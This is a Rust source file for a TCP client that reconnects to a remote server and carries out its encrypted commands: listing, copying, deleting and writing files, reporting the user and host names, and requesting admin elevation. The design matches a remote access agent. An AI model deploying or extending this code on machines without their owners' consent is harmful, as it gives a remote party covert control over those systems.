use std::env;
use std::error::Error;
use std::process::exit;
use std::time::Duration;

use common::messages::info::InfoResponse;
use common::messages::list_files::ListFilesResponse;
use common::messages::ping::PingMessage;
use common::messages::response::{ConfirmResponse, ErrorResponse};
use common::messages::{Message, Packet};
use common::utils::encryption::{decrypt_packet, encrypt_packet, generate_keypair, Encryptor};
use tokio::fs::{copy, OpenOptions};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::sleep;

use crate::files::{list_files, remove};
use crate::privileges::run_as_admin;

pub async fn run_tcp_client(addr: String) {
    loop {
        match TcpStream::connect(&addr).await {
            Ok(mut stream) => {
                println!("Connected to file server!");

                let mut buffer = [0; 4096];
                let mut total_data = Vec::new();

                // Exchange keys with the server
                let encryption = match exchange_keys(&mut stream).await {
                    Some(encryptor) => encryptor,
                    None => {
                        eprintln!("Failed to exchange keys with server.");
                        continue; // Retry the connection
                    }
                };

                loop {
                    match stream.read(&mut buffer).await {
                        Ok(0) => {
                            // 0 bytes read indicates the connection is closed
                            println!("Connection closed by server.");
                            break; // Exit the loop to auto reconnect
                        }
                        Ok(n) => {
                            total_data.extend_from_slice(&buffer[..n]);

                            // Check if the message is complete
                            if message_complete(&total_data) {
                                // Once the message is complete, decrypt and handle the message
                                let decrypted_packet = decrypt_packet(&total_data, &encryption);
                                if let Err(e) = handle_message(
                                    &mut stream,
                                    &Packet::from_bytes(&decrypted_packet),
                                    &encryption,
                                )
                                .await
                                {
                                    eprintln!("Failed to handle message: {}", e);
                                    break; // Exit the loop to auto reconnect
                                }

                                // Clear the buffer after processing the message
                                total_data.clear();
                            }
                        }
                        Err(e) => {
                            eprintln!("Error reading from stream: {}", e);
                            break; // Exit the loop to auto reconnect
                        }
                    }

                    sleep(Duration::from_millis(100)).await; // Prevent busy-waiting
                }
            }
            Err(e) => {
                eprintln!(
                    "Failed to connect to file server: {}. Retrying in 10 seconds...",
                    e
                );
                sleep(Duration::from_secs(10)).await;
            }
        }
    }
}

// Helper function to determine if the message is complete
fn message_complete(data: &[u8]) -> bool {
    if data.len() < 5 {
        return false; // We need at least 5 bytes: 1 for type_id, 4 for the size
    }

    // Read the size from the first 4 bytes after the type identifier
    let size_bytes = &data[1..5]; // The 4 bytes after the type identifier
    let message_size = u32::from_be_bytes(size_bytes.try_into().unwrap()) as usize;

    // Check if the total length of data is at least as large as the size + 5 (type_id + size)
    data.len() >= 5 + message_size
}

// Exchange keys and create an encryptor instance
async fn exchange_keys(stream: &mut TcpStream) -> Option<Encryptor> {
    // Receive the server's public key
    let mut server_public_bytes = [0u8; 32];
    if let Err(_) = stream.read_exact(&mut server_public_bytes).await {
        return None;
    }
    // Send the client's public key to the server
    let keypair = generate_keypair();

    if let Err(_) = stream.write_all(&keypair.public.to_bytes()).await {
        return None;
    }
    // Create the encryptor instance using the keypair and server's public key
    Some(Encryptor::new(keypair, server_public_bytes))
}

// Handle the message received from the server
pub async fn handle_message(
    stream: &mut TcpStream,
    message: &Packet,
    encryption: &Encryptor,
) -> Result<(), Box<dyn Error>> {
    match message {
        Packet::Ping(msg) => {
            //Ping response
            let pong_message = PingMessage {
                message: msg.message.clone(),
            };
            let pong_packet = Packet::Ping(pong_message);
            send_response(stream, &encryption, pong_packet).await?;
        }
        Packet::ListFiles(msg) => {
            match list_files(&msg.path, msg.only_directories).await {
                Ok(files) => {
                    // Send the list of files back to the server
                    let response = ListFilesResponse { files };
                    let response_packet = Packet::ListFilesResponse(response);
                    send_response(stream, &encryption, response_packet).await?;
                }
                Err(e) => send_error(stream, &encryption, e.to_string()).await?,
            }
        }
        Packet::Info(_) => {
            //Info response
            let info_response = InfoResponse {
                // Get the username and computer name from the environment variables
                username: env::var("USERNAME")
                    .or_else(|_| env::var("USER"))
                    .unwrap_or("Unknown".to_string()),
                computer_name: env::var("COMPUTERNAME")
                    .or_else(|_| env::var("HOSTNAME"))
                    .unwrap_or("Unknown".to_string()),
            };
            let info_packet = Packet::InfoResponse(info_response);
            send_response(stream, &encryption, info_packet).await?;
        }
        Packet::CopyFile(msg) => {
            // Copy file
            match copy(&msg.source, &msg.output).await {
                Ok(_) => send_confirm(stream, &encryption).await?,
                Err(e) => send_error(stream, &encryption, e.to_string()).await?,
            }
        }
        Packet::RemoveFile(msg) => {
            // Remove file
            match remove(&msg.path).await {
                Ok(_) => send_confirm(stream, &encryption).await?,
                Err(e) => send_error(stream, &encryption, e.to_string()).await?,
            }
        }
        Packet::PrepareFile(msg) => {
            // Check if the file can be written at this location
            match OpenOptions::new()
                .write(true)
                .create_new(true)
                .open(&msg.output)
                .await
            {
                Ok(mut file) => {
                    // Set the file operation to the new file
                    send_confirm(stream, &encryption).await?;
                    // Download the remote file
                    println!("Downloading file... ({})", msg.output.to_string_lossy());
                    let mut buf = [0; 65536];
                    let mut total_bytes_received: usize = 0;
                    loop {
                        let n = stream.read(&mut buf).await?;
                        if n == 0 {
                            break;
                        }
                        total_bytes_received += n;
                        file.write_all(&buf[..n]).await?;
                        // Check if we have received all the bytes
                        if total_bytes_received == msg.size as usize {
                            break;
                        }
                    }
                }
                Err(e) => send_error(stream, &encryption, e.to_string()).await?,
            }
        }
        Packet::Elevate(_) => {
            // Elevate the client
            if let Err(e) = run_as_admin() {
                send_error(stream, &encryption, e.to_string()).await?;
            } else {
                send_confirm(stream, &encryption).await?;
                sleep(Duration::from_secs(1)).await;
                exit(0);
            }
        }
        _ => {
            eprintln!("Received unknown message");
        }
    }
    Ok(())
}

// Send a response to the server
pub async fn send_response(
    stream: &mut TcpStream,
    encryption: &Encryptor,
    response: Packet,
) -> Result<(), Box<dyn Error>> {
    // Encrypt the response and send it
    let encrypted_packet = encrypt_packet(&response.to_bytes(), encryption);
    stream.write_all(&*encrypted_packet).await?;
    Ok(())
}

// Send an error message to the server
pub async fn send_error(
    stream: &mut TcpStream,
    encryption: &Encryptor,
    error: String,
) -> Result<(), Box<dyn Error>> {
    let error_message = ErrorResponse { error: error };
    let error_packet = Packet::ErrorResponse(error_message);
    send_response(stream, encryption, error_packet).await?;
    Ok(())
}

// Send a confirm response to the server
pub async fn send_confirm(
    stream: &mut TcpStream,
    encryption: &Encryptor,
) -> Result<(), Box<dyn Error>> {
    let confirm_message = ConfirmResponse {};
    let confirm_response = Packet::ConfirmResponse(confirm_message);
    send_response(stream, encryption, confirm_response).await?;
    Ok(())
}
